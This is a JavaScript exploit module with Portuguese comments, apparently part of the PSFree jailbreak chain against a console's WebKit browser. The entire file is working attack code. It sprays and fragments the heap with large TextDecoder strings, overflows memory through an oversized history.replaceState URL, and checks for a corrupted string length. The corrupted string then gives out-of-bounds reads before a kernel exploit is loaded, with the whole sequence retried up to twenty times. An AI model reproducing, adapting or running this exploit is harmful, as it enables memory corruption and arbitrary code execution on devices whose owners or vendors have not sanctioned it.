/* PSFree Modular: 1MB TextDecoder Strategy + Error Trigger Check
   Based on successful "Data Corruption" test.
*/

import { Int } from './module/int64.mjs';
import { log, sleep } from './module/utils.mjs';

// --- CONFIGURAÇÃO VENCEDORA (1MB) ---
// O Offset onde acertamos os DADOS ("1_B...")
const BASE_OFFSET = 709520; 
const OVERFLOW_AMT = 1024 * 64; 

// Tamanho do Objeto Alvo (1MB)
const TARGET_SIZE = 1024 * 1024; 
// Header estimado (24 bytes para StringImpl)
const PAYLOAD_SIZE = TARGET_SIZE - 24; 

var victims = [];

// ===========================================================================
// 1. PREPARAÇÃO DO HEAP (Spray)
// ===========================================================================
async function prepare_heap() {
    // 1. Criar Buffer Bruto (Preenchido com 'B' - 0x42)
    let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
    rawBuffer.fill(0x42); 
    
    // 2. TextDecoder: Força criação de String 8-bit (Flat) no Large Heap
    // Essa foi a única técnica que alinhou corretamente com o Exploit
    let decoder = new TextDecoder("utf-8");
    let baseString = decoder.decode(rawBuffer);

    victims = [];
    const SPRAY_COUNT = 80;

    // 3. Alocação
    for(let i=0; i<SPRAY_COUNT; i++) {
        // Adiciona prefixo único para evitar deduplicação de strings
        let s = i + "_" + baseString.substring((i+"_").length);
        victims.push(s);
    }

    // 4. Buracos (Feng Shui)
    // Apagamos referências alternadas para criar o espaço onde o exploit vai cair
    for(let i=0; i<SPRAY_COUNT; i+=2) {
        victims[i] = null;
    }

    await forceGC();
}

// ===========================================================================
// 2. O GATILHO (Overflow)
// ===========================================================================
async function trigger_exploit() {
    try {
        // Payload: Enche até a borda e transborda com 0x01
        let buffer = "A".repeat(BASE_OFFSET);
        buffer += "\x01".repeat(OVERFLOW_AMT);
        
        // Usamos replaceState para permitir múltiplas tentativas sem estourar cota
        history.replaceState({}, "pwn", "/" + buffer);

        return check_corruption();

    } catch(e) {
        // Ignora erros de memória momentâneos
        return null;
    }
}

// ===========================================================================
// 3. A CHECAGEM (Técnica do PSFree Original)
// ===========================================================================
function check_corruption() {
    for(let i=1; i<victims.length; i+=2) {
        let s = victims[i];
        if(!s) continue;

        try {
            // O PULO DO GATO:
            // Não checamos s.length diretamente.
            // Criamos um objeto Error(s). O WebKit é forçado a reler o Heap 
            // para criar a mensagem de erro. Isso "atualiza" a visão do tamanho.
            let err = new Error(s);
            let msg = err.message;

            // CASO 1: SUCESSO TOTAL (RCE)
            // Se o tamanho mudou, significa que sobrescrevemos o Header (m_length)
            if (msg.length !== PAYLOAD_SIZE) {
                log(`!!! JACKPOT !!! String ${i} Length Corrompido!`, 'green');
                log(`    Old: ${PAYLOAD_SIZE} -> New: ${msg.length}`, 'green');
                
                // Retorna o objeto corrompido para a próxima fase
                return { type: 'RCE', str: msg, idx: i };
            }

            // CASO 2: SUCESSO PARCIAL (DADOS)
            // Se o conteúdo mudou (byte 0x01), sabemos que o exploit funcionou,
            // mas caiu "dentro" da string em vez de no começo.
            if (msg.charCodeAt(0) !== 66) { // 66 = 'B'
                log(`[+] Data Corruption at index ${i} (Offset ${BASE_OFFSET})`, 'yellow');
                return { type: 'DATA', idx: i };
            }

        } catch(e) {}
    }
    return null;
}

// ===========================================================================
// 4. PÓS-EXPLORAÇÃO (Carregamento Modular)
// ===========================================================================
async function stage2_load_kernel(corrupted_str) {
    log("--- RCE UNLOCKED: LOADING KERNEL EXPLOIT ---", 'green');
    
    // Se chegamos aqui, temos uma string com tamanho gigante/falso.
    // Isso permite ler a memória vizinha usando charCodeAt() fora dos limites.
    
    // Exemplo de leitura de teste (Leak Test)
    try {
        // Tenta ler 1MB adiante do fim original
        let leak = corrupted_str.charCodeAt(TARGET_SIZE + 100); 
        log(`[Leak Test] Byte at +1MB: 0x${leak.toString(16)}`, 'green');
        
        // Carrega o Lapse (Jailbreak)
        await import('./lapse.mjs');

    } catch(e) {
        log(`[!] Error initializing primitives: ${e.message}`, 'red');
    }
}

async function forceGC() {
    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
    return new Promise(r => setTimeout(r, 500));
}

// ===========================================================================
// LOOP PRINCIPAL
// ===========================================================================
async function main() {
    log("=== PSFree 12.00: 1MB TextDecoder Engine ===");
    
    // Loop de Persistência: Tenta 20 vezes achar o alinhamento perfeito
    for(let attempt=1; attempt<=20; attempt++) {
        if(attempt % 5 === 0 || attempt === 1) log(`Attempt ${attempt}...`);
        
        await prepare_heap();
        let result = await trigger_exploit();

        if (result) {
            if (result.type === 'RCE') {
                await stage2_load_kernel(result.str);
                return; // VENCEU!
            } 
            if (result.type === 'DATA') {
                // Se achou dados, tenta de novo sem mudar nada.
                // O alinhamento está quase lá, só precisa de sorte no Heap.
                // log(`    (Hit Data, retrying for Header...)`);
            }
        }
        
        // Limpa para a próxima rodada
        victims = [];
        await forceGC();
        await sleep(50);
    }
    
    log("[-] Failed after 20 attempts. Reboot recommended.", 'red');
}

main();
